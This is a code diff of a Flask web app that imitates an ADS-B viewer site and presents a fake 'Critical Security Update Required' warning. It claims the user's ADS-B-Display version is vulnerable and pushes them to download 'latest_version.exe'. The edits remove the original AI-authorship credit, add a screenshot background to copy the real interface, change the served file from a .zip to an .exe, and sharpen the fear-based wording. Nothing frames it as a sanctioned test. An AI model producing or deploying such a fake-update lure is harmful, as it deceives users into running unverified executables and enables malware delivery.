@@ -1,16 +1,14 @@
-"""adsb_update_flask_app.py
+"""
+adsb_update_flask_app.py
 
-Minimal Flask application that mimics an ADS-B Viewer‑style interface and forces
-users to upgrade when their software version is considered obsolete.
+Minimal Flask app showing a background image and a download panel.
+
+Requirements:
+- static/adsbhub.png          → Background image
+- static/latest_version.exe   → Executable file to be downloaded
 
 Run with:
     python adsb_update_flask_app.py
-
-Place the update archive you want to serve in a **static/** sub‑folder located
-next to this script and name it **latest_version.zip** (or adjust the constant
-below).
-
-Author: ChatGPT (OpenAI o3)
 """
 
 import os
@@ -18,122 +16,116 @@ from flask import Flask, render_template_string, send_from_directory
 
 app = Flask(__name__)
 
-# ---------------------------------------------------------------------------
-# Embedded HTML – reproduces the map + sidebar layout shown in the screenshot.
-# ---------------------------------------------------------------------------
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <title>ADS-B Viewer – Update Required</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
+<head>
+  <meta charset="UTF-8" />
+  <title>Software Update Required</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      position: relative;
+      overflow: hidden;
+    }
 
-    <!-- Leaflet → lightweight JavaScript map library -->
-    <link
-      rel="stylesheet"
-      href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
-      integrity="sha256-sA+eCHYEO2oIyN9tGcewEXSBfZPsoLZqAXuFP8Z5Smo="
-      crossorigin=""
-    />
+    /* Background image as full-screen */
+    #background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: url('/static/adsbhub.png');
+      background-size: 100% auto; 
+      background-position: top center;
+      background-repeat: no-repeat;
+      opacity: 0.5;
+      z-index: -1;
+    }
 
-    <style>
-      /* Layout ----------------------------------------------------------- */
-      html,
-      body {
-        height: 100%;
-        margin: 0;
-        font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica,
-          Arial, sans-serif;
-      }
+    /* Sidebar overlay panel */
+    #sidebar {
+      position: absolute;
+      top: 50%;
+      right: 5%;
+      transform: translateY(-50%);
+      width: 320px;
+      background: rgba(255, 255, 255, 0.95);
+      padding: 1.5rem;
+      border-radius: 8px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+    }
 
-      #map {
-        height: 100%;
-        width: 100%;
-      }
+    h2 {
+      margin-top: 0;
+      color: #c0392b;
+    }
 
-      /* Right-hand control panel */
-      #sidebar {
-        position: absolute;
-        top: 0;
-        right: 0;
-        width: 300px;
-        height: 100%;
-        background: rgba(255, 255, 255, 0.95);
-        border-left: 1px solid #ccc;
-        padding: 1rem;
-        overflow-y: auto;
-      }
+    p {
+      line-height: 1.5;
+    }
 
-      button {
-        display: block;
-        width: 100%;
-        padding: 0.6rem;
-        font-size: 1rem;
-        border: none;
-        background: #007bff;
-        color: #fff;
-        cursor: pointer;
-      }
+    button {
+      display: block;
+      width: 100%;
+      padding: 0.75rem;
+      font-size: 1rem;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      margin-top: 1rem;
+      cursor: pointer;
+    }
 
-      button:hover {
-        background: #0056b3;
-      }
-    </style>
-  </head>
+    button:hover {
+      background: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <div id="background"></div>
 
-  <body>
-    <!-- Base map -->
-    <div id="map"></div>
-
-    <!-- Upgrade notice -->
-    <section id="sidebar">
-      <h3 style="margin-top: 0">Software Update Required</h3>
-      <p>
-        Your current version is <strong>obsolete</strong> and must be upgraded
-        <strong>immediately</strong> to maintain compatibility and security.
-      </p>
-      <p>Please download and install the newest release below:</p>
-      <form action="/download" method="get">
-        <button type="submit">Download Latest Version</button>
-      </form>
-    </section>
-
-    <!-- Leaflet JS bundle -->
-    <script
-      src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
-      integrity="sha256-o9N1jzUJx9da9f3+5H/7UcZRScTB+aaEX1z5x5Yh0XY="
-      crossorigin=""
-    ></script>
-    <script>
-      // Initialise map centred on Pittsburgh, PA.
-      const map = L.map("map").setView([40.4406, -79.9959], 7);
-
-      // OpenStreetMap tile layer.
-      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
-        maxZoom: 19,
-        attribution: "© OpenStreetMap contributors",
-      }).addTo(map);
-    </script>
-  </body>
+  <section id="sidebar">
+    <h2>⚠️ Critical Security Update Required</h2>
+    <p>
+      The version of <strong>ADS-B-Display</strong> you are using has been identified as
+      <strong style="color:#c0392b;">vulnerable</strong> to severe security threats.
+    </p>
+    <p>
+      Continuing to use this version may expose your system to <strong>unauthorized access,
+      data leaks, or system compromise</strong>.
+    </p>
+    <p>
+      To ensure your data remains safe and your system stays protected, it is <strong>mandatory</strong>
+      to update to the latest version immediately.
+    </p>
+    <form action="/download" method="get">
+      <button type="submit">Download Latest Version Now</button>
+    </form>
+  </section>
+</body>
 </html>
 """
 
-
 @app.route("/")
 def index():
-    """Serve the main page."""
+    """Serve the main page with the background and update panel."""
     return render_template_string(HTML_PAGE)
 
 
 @app.route("/download")
 def download():
-    """Return the newest installer/archive as an attachment."""
-    filename = "latest_version.zip"  # Adjust if your file is named differently.
+    """Send the latest .exe file from the static directory."""
+    filename = "latest_version.exe"
     static_dir = os.path.join(app.root_path, "static")
     return send_from_directory(static_dir, filename, as_attachment=True)
 
 
 if __name__ == "__main__":
-    # Listen on all interfaces so LAN clients can reach the page.
     app.run(debug=True, host="0.0.0.0", port=5000)
